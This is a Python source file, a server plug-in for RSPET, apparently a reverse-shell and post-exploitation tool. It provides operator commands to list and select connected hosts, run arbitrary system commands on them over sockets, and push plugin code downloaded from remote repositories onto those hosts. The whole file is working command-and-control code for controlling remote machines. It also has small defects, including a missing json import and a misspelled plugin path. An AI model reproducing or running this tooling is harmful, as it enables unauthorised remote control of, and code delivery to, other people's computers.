"""
Plug-in module for RSPET server. Offer functions essential to server.
"""
from __future__ import print_function
from socket import error as sock_error
from urllib2 import urlopen, HTTPError
from Plugins.mount import Plugin, command

class Essentials(Plugin):
    """
    Class expanding Plugin.
    """

    @command("basic", "connected", "multiple")
    def help(self, server, args):
        """List commands available in current state or provide syntax for a command.

        Help: [command]"""
        ret = [None, 0, ""]
        if len(args) > 1:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["help"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            ret[2] = server.help(args)
        return ret

    @command("basic")
    def list_hosts(self, server, args):
        """List all connected hosts."""
        ret = [None, 0, ""]
        hosts = server.get_hosts()
        if hosts:
            ret[2] += "Hosts:"
            for i in hosts:
                inf = hosts[i].info
                con = hosts[i].connection
                ret[2] += ("\n[%s] %s:%s %s-%s %s %s" % (i, con["ip"], con["port"],
                                                         inf["version"], inf["type"],
                                                         inf["systemtype"],
                                                         inf["hostname"]))
        else:
            ret[2] += "No hosts connected to the Server."
        return ret

    @command("connected", "multiple")
    def list_sel_hosts(self, server, args):
        """List selected hosts."""
        ret = [None, 0, ""]
        hosts = server.get_selected()
        ret[2] += "Selected Hosts:"
        for host in hosts:
            #tmp = hosts[i]
            inf = host.info
            con = host.connection
            ret[2] += ("\n[%s] %s:%s %s-%s %s %s" % (host.id, con["ip"], con["port"],
                                                     inf["version"], inf["type"],
                                                     inf["systemtype"],
                                                     inf["hostname"]))
        return ret

    @command("basic")
    def choose_host(self, server, args):
        """Select a single host.

        Help: <host ID>"""
        ret = [None, 0, ""]
        if len(args) != 1 or not args[0].isdigit():
            ret[2] = ("Syntax : %s" % self.__server_cmds__["choose_host"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            ret[1], ret[2] = server.select([args[0]])
            ret[0] = "connected"
        return ret

    @command("basic")
    def select(self, server, args):
        """Select multiple hosts.

        Help: <host ID> [host ID] [host ID] ..."""
        ret = [None, 0, ""]
        if len(args) == 0:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["select"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            ret[1], ret[2] = server.select(args)
            ret[0] = "multiple"
        return ret

    @command("basic")
    def all(self, server, args):
        """Select all hosts."""
        ret = [None, 0, ""]
        ret[1], ret[2] = server.select(None)
        ret[0] = "all"
        return ret

    @command("connected", "multiple")
    def exit(self, server, args):
        """Unselect all hosts."""
        ret = [None, 0, ""]
        ret[0] = "basic"
        return ret

    @command("basic")
    def quit(self, server, args):
        """Quit the CLI and terminate the server."""
        ret = [None, 0, ""]
        server.quit()
        return ret

    @command("connected", "multiple")
    def close_connection(self, server, args):
        """Kick the selected host(s)."""
        ret = [None, 0, ""]
        hosts = server.get_selected()
        for host in hosts:
            try:
                host.trash()
            except sock_error:
                pass
        ret[0] = "basic"
        return ret

    @command("connected")
    def kill(self, server, args):
        """Stop host(s) from doing the current task."""
        ret = [None, 0, ""]
        hosts = server.get_selected()
        for host in hosts:
            try:
                host.send(host.command_dict['KILL'])
            except sock_error:
                host.purge()
                ret[0] = "basic"
                ret[1] = 2 # Socket Error Code
        return ret

    @command("connected")
    def execute(self, server, args):
        """Execute system command on host.

        Help: <command>"""
        ret = [None, 0, ""]
        host = server.get_selected()[0]
        if len(args) == 0:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["execute"].__syntax__)
            ret[1] = 1 #Invalid Syntax Error Code
        else:
            command = " ".join(args)
            try:
                host.send(host.command_dict['command'])
                host.send("%013d" % len(command))
                host.send(command)
                respsize = int(host.recv(13))
                ret[2] += str(host.recv(respsize))
            except sock_error:
                host.purge()
                ret[0] = "basic"
                ret[1] = 2 # Socket Error Code
        return ret

    ############################################################################
    ###                        Server Plugin Section                         ###
    ############################################################################
    @command("basic")
    def install_plugin(self, server, args):
        """Download an official plugin (Install).

        Help: <plugin> [plugin] [plugin] ..."""
        ret = [None, 0, ""]
        for plugin in args:
            server.install_plugin(plugin)
        return ret

    @command("basic")
    def load_plugin(self, server, args):
        """Load an already installed plugin.

        Help: <plugin> [plugin] [plugin] ..."""
        ret = [None, 0, ""]
        for plugin in args:
            server.load_plugin(plugin)
        return ret

    @command("basic")
    def available_plugins(self, server, args):
        """List plugins available online."""
        ret = [None, 0, ""]
        avail_plug = server.available_plugins()
        ret[2] += "Available Plugins:"
        for plug in avail_plug:
            plug_dct = avail_plug[plug]
            ret[2] += ("\n\t%s: %s" % (plug, plug_dct["doc"]))
        return ret

    @command("basic")
    def installed_plugins(self, server, args):
        """List installed plugins."""
        ret = [None, 0, ""]
        inst_plug = server.installed_plugins()
        ret[2] += "Installed Plugins:"
        for plug in inst_plug:
            ret[2] += ("\n\t%s: %s" % (plug, inst_plug[plug]))
        return ret

    @command("basic")
    def loaded_plugins(self, server, args):
        """List loaded plugins."""
        ret = [None, 0, ""]
        load_plug = server.plugins["loaded"]
        ret[2] += "Loaded Plugins:"
        for plug in load_plug:
            ret[2] += ("\n\t%s: %s" % (plug, load_plug[plug]))
        return ret

    ############################################################################
    ###                        Client Plugin Section                         ###
    ############################################################################
    @command("connected", "multiple")
    def client_install_plugin(self, server, args):
        """Install plugin to the selected client(s).

        Help: <plugin>"""
        ret = [None, 0, ""]
        if len(args) < 1:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["client_install_plugin"].__syntax__)
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            cmd = args[0] # Get plugin name
            hosts = server.get_selected()
            # Read contents of plugin.
            with open("Plugins/Client/" + cmd + ".client") as pl_file:
                code = pl_file.read()
            for host in hosts:
                try:
                    host.send(host.command_dict["loadPlugin"]) # Send order
                    host.send("%03d" % len(cmd)) # Send length of plugin name
                    host.send(cmd) # Send plugin name
                    host.send("%13d" % len(code)) # Send length of plugin contents
                    host.send(code) # Send plugin contents
                except sock_error:
                    host.purge()
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
        return ret

    @command("connected", "multiple")
    def plugin_command(self, server, args):
        """Execute a plugin's command to selected host(s).

        Help: <command> [args]"""
        ret = [None, 0, ""]
        if len(args) < 1:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["plugin_command"].__syntax__)
            ret[1] = 1 # Invalid Syntax Error Code
        elif args[0] not in self.__server_cmds__:
            ret[2] = ("Run 'Load_Plugin' first to load local handler.")
        else:
            cmd = args[0] # Read command from args
            args.pop(0) # Remove it from args
            hosts = server.get_selected()
            for host in hosts:
                if cmd not in host.info["commands"]:
                    ret[2] += ("Command not available on client %d" %host.id)
                    ret[0] = "basic"
                    continue
                try:
                    host.send(host.command_dict["runPluginCommand"]) # Send order
                    host.send("%03d" % len(cmd)) # Send command length
                    host.send(cmd) # Send command

                    # TODO: Decide if args are handled centrally or by local handler.

                    #host.send("%02d" % len(args)) # Send number of arguments
                    #for arg in args:
                    #    host.send("%02d" % len(arg)) # Send length of argument
                    #    host.send(arg) # Send argument

                    # Call local handler and pass remaining args
                    res = self.__server_cmds__[cmd](server, host, args)
                    ret[2] += res[2]
                    if res[0] is not None:
                        ret[0] = res[0]
                    if res[1] != 0:
                        ret[1] = res[1]
                except sock_error:
                    host.purge()
                    ret[0] = "basic"
                    ret[1] = 2 # Socket Error Code
        return ret

    @command("basic", "connected", "multiple")
    def available_client_plugins(self, server, args):
        """Get a list of the available client plugins from the selected repos."""
        ret = [None, 0, ""]
        server.plugins["available_client"] = {}
        for base_url in server.plugins["base_url"]:
            try:
                json_file = urlopen(base_url + '/client_plugins.json')
            except HTTPError: # Plugin repo 404ed (most probably)
                server._log("E", "Error connecting to plugin repo %s" % base_url)
                ret[1] = 8 # PluginRepoUnreachable Error code
                continue
            json_dct = json.load(json_file)
            for plugin in json_dct:
                if plugin not in server.plugins["available_client"]:
                    server.plugins["available_client"][plugin] = json_dct[plugin]
            ret[2] += "Available Client Plugins"
            for plugin in server.plugins["available_client"]:
                plug_dct = server.plugins["available_client"][plugin]
                ret[2] += ("\n\t%s: %s" % (plugin, plug_dct["doc"]))
        return ret

    @command("basic", "connected", "multiple")
    def get_client_plugins(self, server, args):
        """Download Client Plugins from the selected repos.

        Help: <plugin> [plugin] [plugin] ..."""
        ret = [None, 0, ""]
        if len(args) < 1:
            ret[2] = ("Syntax : %s" % self.__server_cmds__["get_client_plugins"].__syntax__)
            ret[1] = 1 # Invalid Syntax Error Code
        else:
            # Force client plugin list refresh.
            self.available_client_plugins(server, args)
            avail_plug = server.plugins["available_client"]
            for plugin in args:
                try:
                    plugin_url = server.plugins["available_client"][plugin]
                except KeyError:
                    ret[2] += ("%s: plugin does not exist" % plugin)
                else:
                    # Download the plugin and write it to a file.
                    try:
                        # Download "handler" plugin
                        plugin_obj = urlopen(plugin_url + ".py")
                        plugin_cont = plugin_obj.read()
                        # Download client plugin
                        plugin_obj = urlopen(plugin_url + ".client")
                        plugin_cont_cl = plugin_obj.read()
                    except HTTPError: # Plugin repo 404ed (most probably).
                        ret[2] += ("%s: plugin not available on server." % plugin)
                        server._log("E", "%s: plugin not available on server." % plugin)
                    else:
                        # Create the file for local handler.
                        with open(("Plugins/%s.py" %plugin), 'w') as plugin_file:
                            plugin_file.write(plugin_cont)
                        # Create the file for client plugin
                        with open(("Plugins/Clinet/%s.client" %plugin), 'w') as plugin_file:
                            plugin_file.write(plugin_cont_cl)
                        ret[2] += ("%s: Clinet plugin installed." % plugin)
                        self._log("L", "%s: Clinet plugin installed" % plugin)
        return ret
